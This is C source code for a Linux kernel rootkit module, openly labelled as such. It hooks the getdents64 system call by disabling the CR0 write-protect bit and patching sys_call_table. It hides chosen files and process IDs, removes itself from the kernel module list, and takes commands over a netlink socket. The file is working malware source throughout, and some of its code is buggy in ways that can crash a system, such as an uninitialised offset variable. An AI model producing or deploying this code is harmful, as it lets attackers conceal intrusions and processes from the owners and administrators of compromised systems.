#include <linux/module.h>
#include <net/sock.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/namei.h>

#define LICENCE "GPL"
#define DESCRIPTION "Rootkit that can hide arbitrary ressources by using the configure command line tool."
#define AUTHOR "Benjamin Haag"
#define VERSION "0.7"

#define NETLINK_PROTOCOL 31

#define NUM_SYSCALLS 333

MODULE_LICENSE(LICENCE);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_AUTHOR(AUTHOR);
MODULE_VERSION(VERSION);


typedef struct node {
    long unsigned int inode;
    struct node * next;
} node_t;

node_t * head = NULL;

static int inode_in_list(long unsigned int inode) {
    node_t * node = head;
    while(node != NULL) {
        if (node->inode == inode) return 1;
        node = node->next;
    }
    return 0;
}

static int insert_inode(long unsigned int inode) {

    node_t * node;
    node_t * n;

    if (inode_in_list(inode)) {
        return 0;
    }

    node = (node_t *) kzalloc(sizeof(node_t), GFP_KERNEL);
    if (node == NULL) {
        return -1;
    }

    node->inode = inode;

    if (head == NULL) {
        head = node;
        return 0;
    }

    n = head;
    while(n->next != NULL) {
        n = n->next;
    }

    n->next = node;

    return 0;
}

static int remove_inode(long unsigned int inode) {
    node_t * node = head;
    node_t * last = NULL;

    if (head->inode == inode) {
        head = head->next;
        kfree(node);
        return 0;
    }

    while (node->next != NULL && node->next->inode != inode) {
        node = node->next;
    }

    if (node->next == NULL) return -1;

    last = node;
    node = last->next;
    last->next = node->next;
    kfree(node);

    return 0;

}

static void clear_inodes(void) {
    node_t * node;
    while(head != NULL) {
        node = head;
        head = head->next;
        kfree(node);
    }
}






/***********************************************************
*          HOOK SYSTEM CALLS                               *
***********************************************************/

static struct pt_regs ** sys_call_table;
int (*original[NUM_SYSCALLS])(const struct pt_regs * regs);

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char * name);
kallsyms_lookup_name_t kallsyms_lookup_name_alt;

static int find_sys_call_table(void) {
    register_kprobe(&kp);
    kallsyms_lookup_name_alt = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    sys_call_table = (struct pt_regs **)kallsyms_lookup_name_alt("sys_call_table");

    if (sys_call_table == NULL)
        return -1;

    return 0;
}

unsigned long int cr0;
unsigned long int cr0_new;

static int set_wp(int bit) {
    cr0 = read_cr0();
    cr0 &=~(1<<16);
    cr0 |= bit << 16;
    __asm__ __volatile__ ("mov %0, %%cr0":"+r"(cr0));
    
    cr0_new = read_cr0();
    if(cr0 != cr0_new)
        return -1;
    return 0;
}

static int hook(unsigned int syscall_number, int (*callback)(const struct pt_regs *)) {
    if (set_wp(0) == -1) {
        return -1;
    }
    original[syscall_number] = (int (*)(const struct pt_regs *))sys_call_table[syscall_number];
    sys_call_table[syscall_number] = (struct pt_regs *)callback;
    if (set_wp(1) == -1) {
        return -1;
    }
    return 0;
}

static int unhook(unsigned int syscall_number) {
    if (set_wp(0) == -1) {
        return -1;
    }
    sys_call_table[syscall_number] = (struct pt_regs *)original[syscall_number];
    if (set_wp(1) == -1) {
        return -1;
    }
    return 0;
}





/***********************************************************
*          NEW SYSTEM CALLS                                *
***********************************************************/

int my_getdents64(const struct pt_regs * regs) {

    int length;
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *my_dirent = NULL;
    struct linux_dirent64 *cur_dirent = NULL;
    struct linux_dirent64 *prev_dirent = NULL;
    int offset;

    length = original[__NR_getdents64](regs);
    if (length == 0) {
        return length;
    }

    dirent = (struct linux_dirent64 *)regs->si;

    my_dirent = kzalloc(length, GFP_KERNEL);
    if (dirent == NULL) {
        printk(KERN_ALERT "Rootkit: unable to allocate buffer in %s\n", __FUNCTION__);
        return length;
    }

    if (copy_from_user(my_dirent, dirent, length) == -1) {
        printk(KERN_ALERT "Rootkit: unable to copy user data in %s\n", __FUNCTION__);
        kfree(my_dirent);
        return length;
    }

    while (offset < length) {
        cur_dirent = (void *)my_dirent + offset;
        if (inode_in_list(cur_dirent->d_ino)) {
            printk(KERN_INFO "Rootkit: found hidden file %lld %s\n", cur_dirent->d_ino, cur_dirent->d_name);
            if (!prev_dirent) {
                length -= cur_dirent->d_reclen;
                memmove(cur_dirent, (void *)cur_dirent + cur_dirent->d_reclen, length);
                continue;
            }
            prev_dirent->d_reclen += cur_dirent->d_reclen;
        } else {
            prev_dirent = cur_dirent;
        }
        offset += cur_dirent->d_reclen;
    }

    if (copy_to_user(dirent, my_dirent, length) ) {
        printk(KERN_ALERT "Rootkit: Failed to copy to user in getdents64\n");
    }
    kfree(my_dirent);
    return length;
}





/***********************************************************
*          CONFIGURE MODULE                                *
***********************************************************/

static struct list_head *prev_save;

static void hidemodule(void) {
    if (prev_save) return;
    prev_save = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void showmodule(void) {
    if (!prev_save) return;
    list_add(&THIS_MODULE->list, prev_save);
}

static char * hidefile(const char * file) {
    struct path path;
    path.dentry = NULL;
    kern_path(file,LOOKUP_FOLLOW, &path);
    if(path.dentry == NULL) {
        return "no such file or directory.";
    }
    
    if(insert_inode(path.dentry->d_inode->i_ino) == -1) {
        return "could not hide file";
    }
    return "hiding requested file!";
}

static char * showfile(const char * file) {
    struct path path;
    path.dentry = NULL;
    kern_path(file,LOOKUP_FOLLOW, &path);
    if(path.dentry == NULL) {
        return "no such file or directory.";
    }
    
    if(remove_inode(path.dentry->d_inode->i_ino) == -1) {
        return "file not hidden.";
    }
    return "unhide requested file!";
}

static char * configure(char * command) {
    if (strcmp(command, "hidemodule") == 0) {
        hidemodule();
        return "Module is now hidden.";
    }
    if (strcmp(command, "showmodule") == 0) {
        showmodule();
        return "Module is now shown.";
    }
    if (strncmp(command, "hidefile ", 9) == 0) {
        return hidefile(command+9);
    }
    if (strncmp(command, "showfile ", 9) == 0) {
        return showfile(command+9);
    }
    if (strncmp(command, "hidepid ", 8) == 0) {
        strncpy(command+2,"/proc/",6);
        return hidefile(command+2);
    }
    if (strncmp(command, "showpid ", 8) == 0) {
        strncpy(command+2,"/proc/",6);
        return showfile(command+2);
    }
    printk(KERN_INFO "Rootkit: unknown command %s\n", command);
    return "Error: unknowm command";
}





/***********************************************************
*          NETLINK COMMUNICATION                           *
***********************************************************/

struct sock *nl_sock = NULL;

static void nl_recv_msg(struct sk_buff *);
struct netlink_kernel_cfg cfg = {
    .input = nl_recv_msg,
};

struct nlmsghdr *nlh;
struct sk_buff *skb_out;
char * msg;
int pid;
int msg_len;
int res;

static int create_socket(void) {
    nl_sock = netlink_kernel_create(&init_net, NETLINK_PROTOCOL, &cfg);
    if(!nl_sock) {
        return -1;
    }
    return 0;
}

static void close_socket(void) {
    netlink_kernel_release(nl_sock);
    nl_sock = NULL;
}

static void nl_recv_msg(struct sk_buff * skb) {

    // get data from packet
    nlh = (struct nlmsghdr*)skb->data;
    msg = (char *)nlmsg_data(nlh);
    pid = nlh->nlmsg_pid;

    printk(KERN_INFO "Received: %s (%ld Bytes)\n", msg, strlen(msg));

    // prepare response data
    msg = configure(msg);
    msg_len = strlen(msg);

    // allocate space for message
    skb_out = nlmsg_new(msg_len, 0);
    if(!skb_out) {
        printk(KERN_ERR "Failed to allocate new skb\n");
        return;
    }

    // pack response
    nlh=nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_len, 0);
    NETLINK_CB(skb_out).dst_group = 0;
    strncpy(nlmsg_data(nlh), msg, msg_len);

    // send packet
    res = nlmsg_unicast(nl_sock, skb_out, pid);
    if (res == -1) {
        printk(KERN_ALERT "Error sending response\n");
    }
}





/***********************************************************
*          MODULE SETUP                                    *
***********************************************************/

static int __init
module_load(void) {

    printk(KERN_INFO "Rootkit: loaded. Hello!\n");

    if(create_socket() != 0) {
        printk(KERN_ERR "Rootkit: unable to create socket!");
        return -1;
    }

    if(find_sys_call_table() == -1) {
        printk(KERN_ERR "Rootkit: could not find sys_call_table :(\n");
        return -1;
    }

    // Rootkit should not return past this point. Once a syscall
    // is hooked and the module unexpectedly unloads, the system
    // will crash.

    if(hook(__NR_getdents64, my_getdents64) != 0) {
        printk(KERN_ERR "Rootkit:");
    }

    

    return 0;
}

static void __exit
module_unload(void) {

    if(unhook(__NR_getdents64) != 0) {
        printk(KERN_ERR "Rootkit:");
    }

    clear_inodes();

    close_socket();

    printk(KERN_INFO "Rootkit: unloaded. Bye Bye!\n");

}


module_init(module_load);
module_exit(module_unload);